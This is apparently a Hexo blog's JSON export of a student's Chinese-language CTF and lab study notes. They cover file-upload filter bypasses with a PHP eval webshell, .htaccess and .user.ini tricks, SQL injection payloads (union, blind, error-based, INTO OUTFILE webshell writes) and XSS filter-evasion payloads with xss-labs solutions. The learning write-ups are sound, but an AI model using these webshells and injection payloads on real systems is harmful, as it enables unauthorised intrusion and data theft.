{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"文件上传漏洞一些wp","slug":"文件上传漏洞","date":"2025-02-12T15:27:08.000Z","updated":"2025-02-15T10:09:11.063Z","comments":true,"path":"2025/02/12/文件上传漏洞/","permalink":"http://example.com/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"稍微写写uplode-labss靶场的题解 1.前端拦截绕过一句话木马&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;改成1.jpg上传再在bp改成1.php就行 2.content-type绕过后端拦截，bp能抓到包，正常上传1.php再改content-type改成能通过的就行","text":"稍微写写uplode-labss靶场的题解 1.前端拦截绕过一句话木马&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;改成1.jpg上传再在bp改成1.php就行 2.content-type绕过后端拦截，bp能抓到包，正常上传1.php再改content-type改成能通过的就行 3.不会（别名攻击（看了wp。看原码是用黑名单，.php不能用，可以上传.php3, .php5，但是上传后无法连接。要配置Apache的http.conf。加入一行 AddType application/x-httpd-php .php .php3 ...(以这些后缀的文件用php解析) 还要切换没有nts的php版本。。（我拿不到权限。。配不了 4. .htaccess 绕过一般要修改权限啊配置啥的就用这个还是用黑名单，所以可以上传.htaccess : 1234&lt;FilesMatch &quot;1&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;#文件名是1的按php解析 再上传1.jpg（木马）即可 插播：1234567891011.htaccess作用：分布式文件，一般用于URL 重写，认证，访问控制等作用范围：特定目录（一般是网站根目录）及其子目录优先级：较高，可覆盖httpd-conf生效方式：修改后立即生效httpd-conf作用：包含Apache HTTP 服务器的全局行为和默认设置作用范围：整个服务器优先级:较低生效方式：管理员权限，重启服务器后生效 5. 点空格点绕过&#x2F;.user.ini绕过点空格点：看了源码， 123456$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, &#x27;.&#x27;);$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空 上传1.php，然后在bp中改为1.php. . 最后名字变为1.php. (Windows中运行文件时自动去掉后面的点和空格，所以蚁剑连接时URL要写1.php，去掉后面的点。 .user.ini:&#x2F;* 模版：Auto-prepend-file&#x3D;1111.txt (在运行其他文件之前都会包含1111.txt中的php代码) 例： A：echo “hello” .php B：echo “world” .txt Auto-prepend-file&#x3D;b.txt 输出：hello world *&#x2F; 写一个.user.ini：Auto-prepend-file=1.jpg上传 写一个一句话木马以jpg格式上传 （前提是上传的目录中本来有php文件，蚁剑连接时要访问这个文件，没权限根本做不了） 插播：12345678910.user.ini作用：特定于用户或特定目录的配置文件，通常位于web应用程序的根目录下，用于覆盖或追加全局配置文件（如php.ini）中的php配置选项作用范围：存放在改文件的目录以及其子目录下优先级：较高，可覆盖php.ini生效方式：立即生效php.ini作用：储存对整个php环境生效的配置选项，通常位于php安装目录中作用范围：所有运行在该php环境中的php请求优先级：较低生效方式：重启php或web服务器 6.大小写绕过源码： 1234$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, &#x27;.&#x27;);$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空 上传1.php，在bp中改为1.Php（这个后缀没在黑名单里）即可 7.空格绕过源码： 12345$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, &#x27;.&#x27;);$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA 上传1.php，在bp中改为1.php （后面加一堆空格）（这个后缀没在黑名单里）即可 8.后缀加点绕过源码中没有$file_name = deldot($file_name);//删除文件名末尾的点 后缀后面加个点就行了 9.$DATA绕过源码中没有$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA 上传1.php，在bp中改为1.php::$DATA，蚁剑连接1.php 插播：1234567额外数据流：&quot;1.txt::$DATA&quot;是&quot;1.txt&quot;的一个附加数据流，这样的数据流可以用于储存文件的元数据，备份信息，标签等。写入方法（在cmd中）：echo 内容 &gt;&gt;文件名：数据流名type 文件名2&gt;&gt;文件名1：数据流名 （文件名2中的内容写到文件名1中的额外数据流中查看方法（cmd）：notepad 文件名：数据流名 10.点空格点绕过详见第5点 11.双写绕过源码： 12345$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); //在输入的$file_name把$deny_ext替换成&quot;&quot;$temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];$img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; 上传1.php，在bp中改为1.pphphp，蚁剑连接1.php Normal_Fileupload题解一句话木马&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;改后缀为jpg上传后再在bp改回后缀php，上传成功再在蚁剑连接，文件里有flag（撒花 zip_upload题解写个.htaccess文件： 123&lt;FilesMatch &quot;1&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 再写个1.php一句话木马 在桌面选中两个文件添加到一个压缩包上传即可。 （之前一直是两个放入一个文件夹再压缩文件夹上传，没注意又多了一级，两级相同名字，死活连不成功，还好后来发现了。。 SQLI_with_rce本来想用load_file(‘&#x2F;var&#x2F;www&#x2F;html’)读一下看能不能爆出服务器路径，但是发现疑似有302，马上去bp看看，发现有set-cookie，但是好像没什么用 上网半天，发现有个into outfile可以写入文件（前提有写入权限，不过有hint权限是777，马上去试试 输入：1‘ union select 1，”&lt;?php eval([&#39;cmd&#39;]);?&gt;“，3 into outfile ‘1.php’# password&#x3D;1 上蚁剑连接，URL：题目网址&#x2F;1.php 成功！","categories":[],"tags":[]},{"title":"php","slug":"php","date":"2025-02-08T04:30:38.000Z","updated":"2025-02-15T10:07:51.686Z","comments":true,"path":"2025/02/08/php/","permalink":"http://example.com/2025/02/08/php/","excerpt":"","text":"文件上传webshellweb的一个管理工具，可以对web服务器进行操作的权限 php中最经典的webshell是：&lt;?php eval($_post[&#39;cmd&#39;]);?&gt;（一句话木马） 注：eval($code) 是把字符串$code作为php代码执行 工具：中国蚁剑 php中的文件上传$_FILES超全局变量$_FILES，它是一个数组，其包含了所有上传的文件信息 例如上传一个表单的name属性值为file，即&lt;input name=&quot;file&quot; type=&quot;file&quot; /&gt; $_FILES数组内容：1.$_FILES[&#39;file&#39;][&#39;name&#39;]2.$_FILES[&#39;file&#39;][&#39;type&#39;]3.$_FILES[&#39;file&#39;][&#39;size&#39;]4.$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]文件被上传后在服务端存储的临时文件名, 在请求结束后该临时文件会被删除5.$_FILES[&#39;file&#39;][&#39;error&#39;]错误代码如果多文件上传，则上面变量会变成一个数组 如$_FILES[&#39;file&#39;][&#39;name&#39;][0]，$_FILES[&#39;file&#39;][&#39;name&#39;][1]","categories":[],"tags":[]},{"title":"SQL注入","slug":"SQL注入","date":"2025-01-25T09:50:38.000Z","updated":"2025-02-16T09:51:51.436Z","comments":true,"path":"2025/01/25/SQL注入/","permalink":"http://example.com/2025/01/25/SQL%E6%B3%A8%E5%85%A5/","excerpt":"SQL注入SQL注入漏洞SQL注入中常用的函数及命令 union：合并两个或多个select语句 语法：select column_name from table_name1 union select column_name from table_name2 (!数据型和列数要相同) order by：排序，默认升序 concat：将多个字符串连接成一个字符串 语法：concat(str1,str2) 注意：只要有一个参数为null，则返回值为null group_concat()函数：将group by产生的同一分组中的值连接起来，返回一个字符串。 （group by：group by x 根据x的规则分组 例子: 以id分组，把name字段的值打印在一行 mysql&gt;select name,group_cat(age) from major group by name substr()函数：用来截取数据库某字段的一部分 语法: substr(string,start,length) (length可选，缺省默认截取到结束位置 database():当前数据库","text":"SQL注入SQL注入漏洞SQL注入中常用的函数及命令 union：合并两个或多个select语句 语法：select column_name from table_name1 union select column_name from table_name2 (!数据型和列数要相同) order by：排序，默认升序 concat：将多个字符串连接成一个字符串 语法：concat(str1,str2) 注意：只要有一个参数为null，则返回值为null group_concat()函数：将group by产生的同一分组中的值连接起来，返回一个字符串。 （group by：group by x 根据x的规则分组 例子: 以id分组，把name字段的值打印在一行 mysql&gt;select name,group_cat(age) from major group by name substr()函数：用来截取数据库某字段的一部分 语法: substr(string,start,length) (length可选，缺省默认截取到结束位置 database():当前数据库 SQL注入漏洞种类1. union注入（整型和字符型）整型：$sql=&quot;select * from major where id=$id limit 0,1&quot; 字符型：$sql=&quot;select * from major where id =&#39;$id&#39; limit 0,1&quot; 例子： (1)输入1‘（单引号破坏句子完整性 ​ (2)用and判断是否真实存在sql注入 ​ 查询命令：id&#x3D;1’and1&#x3D;1# 和 id&#x3D;1‘and1&#x3D;2# ​ （#后面的内容注释掉 ​ （这里访问id &#x3D; 1 and 1&#x3D;1，由于and 1&#x3D;1恒为真，所以返回的页 面肯定是是返回与id&#x3D;1相同的结果，但是访问id &#x3D; 1 and 1&#x3D;2， 由于and 1&#x3D;2恒为假，所以返回的页面肯定是与id&#x3D;1不相同的结 果，所以第一条命令回显，第二条命令不回显，说明存在sql注入 ​ (3)查表单 ​ （前情提要：之前回显的有名字，Math，English，Chinese，所有判断有4个列数 ​ 查询命令：id&#x3D;1’ order by 5# 果然，不回显 ​ 查询命令：id&#x3D;5‘ union select database(),1,2,3# ​ 得到数据库名：skctf ​ 查询命令：id&#x3D;5’ union select table_name,1,2,3 from information_schema.tables where table_schema&#x3D;’skctf’ # ​ 得到表名为fl4g ​ 查询命令：id&#x3D;5‘ union select column_name,1,2,3 from information_schema.columns where table_name&#x3D;’fl4g’ # ​ 得到字段名是skctf_flag ​ 查询命令：id&#x3D;5’ union select skctf_flag 1 2 3 from fl4g# ​ 最后得flag 2. Boolean注入（布尔盲注）工具：sqlmap(目前还不会用)，bp(半自动查找哈哈哈哈哈，累死)（1）数据库长度和具体字符 ​ id&#x3D;1’ and&#x2F;or (length(database()))&#x3D; x # ​ id&#x3D;1’ and&#x2F;or ascii(substr(database(),1,1))&#x3D; x # &#x2F;&#x2F;根据第几个字符变换中间的1 （2）查表 ​ id&#x3D;1’ and&#x2F;or length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&#x3D; x # ​ &#x2F;&#x2F;limit 0,1是第一条数据，limit 1,1是第二条数据，如果length(… limit 1,1)&gt;0成立代表有两条数据，以此类推 ​ id&#x3D;1’ and&#x2F;or ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D; x # ​ （3）查表中有几列 ​ id&#x3D;1’ and&#x2F;or (select count(column_name) from information_schema.columns where table_name&#x3D;”表名”)&#x3D; x # ​ （4）查表中第一列有多长，具体字符 ​ id&#x3D;1’ and&#x2F;or length((select column_name from information_schema.columns where table_name&#x3D;”表名” limit 0,1))&#x3D; x # ​ id&#x3D;1’ and&#x2F;or ascii(substr((select column_name from information_schema.columns where table_name&#x3D;”表名” limit 0,1)),1,1)&#x3D; x # ​ （5）查第一列中的详细信息 ​ id’ and&#x2F;or (select count(列名) from 表名)&#x3D; x # ​ id&#x3D;1’ and&#x2F;or ascii(substr(select 列名 from 表名 limit 0,1),1,1)&#x3D; x # 3. 时间盲注结果正确就拉长反应时间，通过时间长度判断 模版语句：if(…,sleep(3),1) 贴个脚本 4. 报错注入updatexml()函数：更新xml文档的函数，返回替换的xml片段语法：updatexml(xml_documat,XPath_string,new_value) 参数： xml_documat：是STRING格式，为XML文档对象的名称，这一项可以输入一个十六进制的字符，比如0x26（&amp;）。 XPath_string：是XPath的格式的字符串，报错注入时需要写入错误的格式来显示错误的信息。 new_value：是string格式替换查找到符合条件的数据，在注入时可以加入任意字符，比0x26（&amp;）。 extractvalue()函数：使用XPath表示从XML字符串中提取值，从目标XML中返回包含所查询值的字符串​ 语法：extractvalue(xml_documat, XPath_string) ​ 参数： ​ xml_documat：是STRING格式，为XML文档对象的名称，这一项可以输入一个十六进制的 字符，比如0x26（&amp;）。 ​ XPath_string：是XPath的格式的字符串，报错注入时需要写入错误的格式来显示错误的信 息。 ​ (1)爆数据库名 ​ 1’ or updatexml(1,concat(0x26,database(),0x26),1) # ​ 出现报错：error! XPath syntax error:’&amp;数据库名&amp;’ ​ (2)爆表名 ​ 1’ or updatexml(1,concat(0x26,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D;(‘数据库名’)),0x26),1) # ​ 出现报错：error! XPath syntax error:’&amp;表名&amp;’ ​ (3)爆列名 ​ 1’ or updatexml(1,concat(0x26,(select group_concat(column_name) from information_schema.columns where table_name &#x3D;(‘表名’)),0x26),1) # ​ (3)爆具体信息 ​ 1’ or updatexml(1,concat(0x26,(select group_concat(列名,’～’,列名) from 表名),0x26),1) # ​ (4)字符限制flag可能只显示前半部分，所有用right函数从后开始显示 ​ 1’ or updatexml(1,concat(0x26,(select group_concat(right(表名，长度)) from 表名),0x26),1) # 5.堆叠查询注入堆叠查询可以执行多条语句，多语句之间用分号隔开 （1）查数据库名：0’ ;show databases;# （2）查表名：0’ ;show tables;#","categories":[],"tags":[]},{"title":"xss","slug":"xss","date":"2025-01-24T14:14:35.000Z","updated":"2025-02-21T18:13:57.910Z","comments":true,"path":"2025/01/24/xss/","permalink":"http://example.com/2025/01/24/xss/","excerpt":"今天学了点xss一、xss攻击方式 反射型xss 非持久化，要点击事先制造好的攻击链接才能触发xss代码，一般出现在搜索界面。 储存型xss 持久化，代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行。 DOM型xss 基于文档对象模型Document Object Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。一般是浏览器前端代码进行处理。———————————————— 版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。 原文链接：https://blog.csdn.net/huangyongkang666/article/details/123624164","text":"今天学了点xss一、xss攻击方式 反射型xss 非持久化，要点击事先制造好的攻击链接才能触发xss代码，一般出现在搜索界面。 储存型xss 持久化，代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行。 DOM型xss 基于文档对象模型Document Object Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。一般是浏览器前端代码进行处理。———————————————— 版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。 原文链接：https://blog.csdn.net/huangyongkang666/article/details/123624164 二、一些常用的标签和属性 script标签 &lt;script&gt;用于定义客户端脚本，比如JavaScript &lt;script&gt;alert()&lt;/script&gt; &lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt; input标签 &lt;input&gt;规定了用户可以在其中输入数据的输入字段 onfocus 点击时发生 &lt;input onfocus=alert(1)&gt; img标签 &lt;img&gt;定义HTML页面中的图像 &lt;img src=1 onerror=alert(1)&gt; &lt;img src=1 onerror=alert(&quot;xss&quot;)&gt; 三、常见基本过滤方法 空格被过滤（用&#x2F;代替空格 /**/，注释符号绕过；/符号绕过； &lt;img/src=&quot;x&quot;/onerror=alert(1);&gt; 也可以： &lt;img/src=&quot;x&quot;onerror=alert(1);&gt; 引号被过滤 ​ 在js中，可以用反引号代替单双引号 ​ &lt;img src=x onerror=alert（´xss´）&gt; 括号被过滤 用throw来绕过 &lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt; ​ &lt;a onmouseover=&quot;javascript:window.onerror=alert;throw 1&quot;&gt; 关键字被过滤掉（核心：去掉被替换的字代码还能用 （1）大小写绕过 &lt;sCRiPt&gt;alert()&lt;/sCrIpT&gt; &lt;ImG sRc=x onerRor=alert()&gt; ​ (2)双写绕过 ​ &lt;scrscriptipt&gt;alert()&lt;/scrscriptipt&gt; ​ &lt;imimgg srsrcc=x onerror=alert()&gt; ​ (3)字符串拼接绕过 ​ 利用eval（）函数 ​ 与PHP的eval（）函数相同，JavaScript的eval（）函数也可以计算JavaScript字符串，并把它作为脚本代码来执行 ​ &lt;img src=&quot;x&quot; onerror=&quot;a=&#39;aler&#39;;b=&#39;t&#39;;c=&#39;(1)&#39;;eval(a+b+c)&quot;&gt; ​ (4)编码绕过 ​ ！href属性自动解析Unicode编码 ​ javascript：alert() ​ 在线Unicode编码解码后： ​ &amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41; ​ 插入href中： ​ &lt;a href=javascript:alert()&gt;&lt;/a&gt; tips:&lt;a href=&quot;xxx&quot;&gt;aaa&lt;/a&gt;当aaa被点击时跳转到xxx网址 JavaScript伪协议（应对o_n和过滤 &quot;&gt;&lt;a href=javascript:alert()&gt; 一套码测测关键字：&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106; xss_labs题解1.&lt;scripr&gt;alert()&lt;/script&gt;即可 2.前面加&quot;&gt;将前面闭合然后alert即可 3.单引号闭合，因为&gt;&lt;被实体化了，所有我们用伪协议绕过，&#39; onfocus=javascript:alert() &#39; ​ (onfocus再次点击触发) 4.双引号闭合&quot; onfocus=javascript:alert() &quot; 5.这一关on被换成o_n，所有不能用伪协议，改用超链接&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot;,再点击xxx即可 6.大小写绕过 &quot;&gt; &lt;sCript&gt;Alert()&lt;/sCript&gt; &lt;&quot; 7.输入一串关键字看看 Onfocus &lt;sCrIpt&gt; &lt;a href=javascript:alert()&gt;,看传进去的参里没有href，script，on，这些词被过滤掉了，所有用双写绕过 &quot;&gt; &lt;a hrhrefef=javasscriptcript:alert()&gt;xxx&lt;/a&gt; &lt;&quot; 8.先传参123进入，发现插入两个地方，一个input，一个href，大概率是unicode编码，直接将 javascript:alert()编码后传入即可 9.照例写个超链接看看，结果插入不成功，看源码，发现要插入指定内容（本题是http:&#x2F;&#x2F;）所以在后面加入http:&#x2F;&#x2F;再用注释符注释掉即可 10.value隐藏了，只能去看看源码，发现是get传参t_sort,并过滤掉了&gt;&lt;号，不能闭合插入标签，能用onfocus，因为输入框被隐藏了，需要添加type&#x3D;”text”，构造payload ?t_sort&quot; onfocus=javascript:alert() type=&quot;text 11.referer头，抓包添加referer: &quot; sRc Date Onfocus &lt;sCript&gt; &lt;a hRef=javascript:alert()&gt; &amp;#106;测一下，发现过滤掉了&gt;&lt; ,所有用onfocus，Referer: &quot;onfocus=javascript:alert() type=&quot; text 12.随便传参看看，发现value里是user-Agent的值，所有抓包改user-Agent，&quot; onfocus=javascript:alert() type=&quot;text 13.name是t_cook ,考虑是cookie头，F12找到cookie名为user，改user的value &quot; onfocus=javascript:alert() type=&quot;text","categories":[],"tags":[]},{"title":"http","slug":"http","date":"2025-01-24T09:46:28.000Z","updated":"2025-02-16T09:53:06.525Z","comments":true,"path":"2025/01/24/http/","permalink":"http://example.com/2025/01/24/http/","excerpt":"httphttp请求分为： 请求头：包括请求方法，版本等 请求体： 发给repeater（重发器）后可以右键改变请求方式,发送请求包。 User-agent:检测使用设备类型，windows,android等。 post方法需要加content-type（在hacker-bar中可选） ​ application&#x2F;xfu:是发送a&#x3D;2之类的表单 ​ application&#x2F;xfu(raw):可以传图片，文件头（十六进制数） ​ application&#x2F;json","text":"httphttp请求分为： 请求头：包括请求方法，版本等 请求体： 发给repeater（重发器）后可以右键改变请求方式,发送请求包。 User-agent:检测使用设备类型，windows,android等。 post方法需要加content-type（在hacker-bar中可选） ​ application&#x2F;xfu:是发送a&#x3D;2之类的表单 ​ application&#x2F;xfu(raw):可以传图片，文件头（十六进制数） ​ application&#x2F;json Cookie:一般是象征身份的随机字符 xff: 127.0.0.1（ 主机环回地址，可以自己发给自己 ） 控制台按F2可以看到二维数组 302是重定向，可以在repeater中follow 方法： get post put delete head(与GET相比，没有响应体，只有存活判断) 可以自定义 hackerbar可以发post的json（可选）,但是方法可以被bp再修改 然后看看repeater 能看到的都是前端 服务器是后端 F12可以看源代码（前端） ctrl+u可以看html 俩之间的才是js，其他都是html html是大的框架（提供元素），jss是干正式的(?)，css用于美化网页 js会看就行（bushi） js重点： 1.事件监听（一定要会） 2.选取html的元素，添加或修改属性值 3.创建html标签，增加属性，并追加DOM","categories":[],"tags":[]},{"title":"my first blog","slug":"my-first-blog","date":"2025-01-23T16:12:27.000Z","updated":"2025-01-23T16:21:37.781Z","comments":true,"path":"2025/01/24/my-first-blog/","permalink":"http://example.com/2025/01/24/my-first-blog/","excerpt":"","text":"第一章 重生之发一篇博客文章试试水","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2025-01-23T09:42:56.451Z","updated":"2025-01-23T09:42:56.451Z","comments":true,"path":"2025/01/23/hello-world/","permalink":"http://example.com/2025/01/23/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[]}